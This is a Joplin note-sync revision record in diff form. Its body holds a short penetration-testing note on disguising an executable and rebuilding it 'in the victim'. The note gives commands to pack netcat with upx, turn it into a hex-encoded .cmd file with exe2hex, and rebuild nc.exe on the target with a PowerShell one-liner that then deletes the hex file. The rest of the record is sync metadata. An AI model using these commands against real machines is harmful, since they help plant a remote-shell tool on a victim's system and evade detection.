@@ -1,0 +1,13 @@
+id: a0a30575f0b747ccbce5cb5ce9ece2a2
+parent_id: 
+item_type: 1
+item_id: eb0dd24d50ca438a82aff2cc7e226ee9
+item_updated_time: 1646016697028
+title_diff: "[{\"diffs\":[[1,\"3822cc0f7b034c9182855c18663965d9\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":32}]"
+body_diff: "[{\"diffs\":[[1,\"Upload by Hex Content\\\r\\\n\\\r\\\n## For concealing what the exe file is, and rebuilding the file in the victim\\\r\\\n\\\r\\\nFirst use upx to reduce the size of the file, but maintain its operability\\\r\\\n\\\r\\\n> upx -9 nc.exe\\\r\\\n\\\r\\\nThen convert the EXE to a file with HEX values. Use the .cmd for reference\\\r\\\n\\\r\\\n> exe2hex -x nc.exe -p nc.cmd\\\r\\\n\\\r\\\nOnce the file is transferred, run the program (using command prompt), and then compile it to nc.exe with powershell\\\r\\\n\\\r\\\n> ./nc.cmd\\\r\\\n> \\\r\\\n> powershell -Command \\\"$h=Get-Content -readcount 0 -path './nc.hex'; $l=$h\\\\[0\\\\].length;$b=New-Object byte\\\\[\\\\] ($l/2);$x=0;for ($i=0;$i -le $l-1;$i+=2){$b\\\\[$x\\\\]=\\\\[byte\\\\]::Parse($h\\\\[0\\\\].Substring($i,2),\\\\[System.Globalization.NumberStyles\\\\]::HexNumber);$x+=1}; Set-Content -encoding byte 'nc.exe' -value $b; Remove=Item -force nc.hex;\\\"\\\r\\\n\\\r\\\nid: 3822cc0f7b034c9182855c18663965d9\\\r\\\nparent_id: 819fca2060d64809bbdac4fc93fdd86a\\\r\\\ncreated_time: 2022-01-28T02:01:40.100Z\\\r\\\nupdated_time: 2022-01-28T02:32:43.927Z\\\r\\\nis_conflict: 0\\\r\\\nlatitude: 0.00000000\\\r\\\nlongitude: 0.00000000\\\r\\\naltitude: 0.0000\\\r\\\nauthor: \\\r\\\nsource_url: \\\r\\\nis_todo: 0\\\r\\\ntodo_due: 0\\\r\\\ntodo_completed: 0\\\r\\\nsource: joplin-desktop\\\r\\\nsource_application: net.cozic.joplin-desktop\\\r\\\napplication_data: \\\r\\\norder: 0\\\r\\\nuser_created_time: 2022-01-28T02:01:40.100Z\\\r\\\nuser_updated_time: 2022-01-28T02:32:43.927Z\\\r\\\nencryption_cipher_text: \\\r\\\nencryption_applied: 0\\\r\\\nmarkup_language: 1\\\r\\\nis_shared: 0\\\r\\\nshare_id: \\\r\\\nconflict_original_id: \\\r\\\nmaster_key_id: \\\r\\\ntype_: 1\"]],\"start1\":0,\"start2\":0,\"length1\":0,\"length2\":1429}]"
+metadata_diff: {"new":{"id":"eb0dd24d50ca438a82aff2cc7e226ee9","parent_id":"fb73d1d872ce4ee6ab184091f1e4c67b","latitude":"0.00000000","longitude":"0.00000000","altitude":"0.0000","author":"","source_url":"","is_todo":0,"todo_due":0,"todo_completed":0,"source":"joplin-desktop","source_application":"net.cozic.joplin-desktop","application_data":"","order":1646016697016,"markup_language":1,"is_shared":0,"share_id":"","conflict_original_id":"","master_key_id":""},"deleted":[]}
+encryption_cipher_text: 
+encryption_applied: 0
+updated_time: 2022-02-28T02:54:22.624Z
+created_time: 2022-02-28T02:54:22.624Z
+type_: 13
